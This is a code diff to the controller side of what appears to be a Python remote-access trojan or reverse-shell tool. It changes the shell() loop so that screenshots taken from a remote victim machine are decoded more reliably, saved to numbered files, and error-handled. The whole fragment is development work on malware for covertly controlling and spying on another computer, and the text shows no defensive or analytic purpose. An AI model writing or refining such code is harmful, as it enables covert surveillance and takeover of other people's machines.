@@ -45,14 +45,17 @@ def shell():
                 reliable_send(base64.b64encode(failed.encode()))
                 continue
         elif command[:10] == 'screenshot':
-            with open("screenshot%d" % count, 'wb') as screen:
-                image = reliable_recv()
+            image = reliable_recv()
+            try:
                 image_decoded = base64.b64decode(image)
-                if image_decoded[:4] == '[!!]':
-                    print(image_decoded)
+                if image_decoded[:4] == b'[!!]':
+                    print(image_decoded.decode())
                 else:
-                    screen.write(image_decoded)
+                    with open("screenshot%d" % count, 'wb') as screen:
+                        screen.write(image_decoded)
                     count += 1
+            except Exception as e:
+                print(f"[!!] Failed to decode image: {e}")
         else:
             result = reliable_recv()
             print(result)
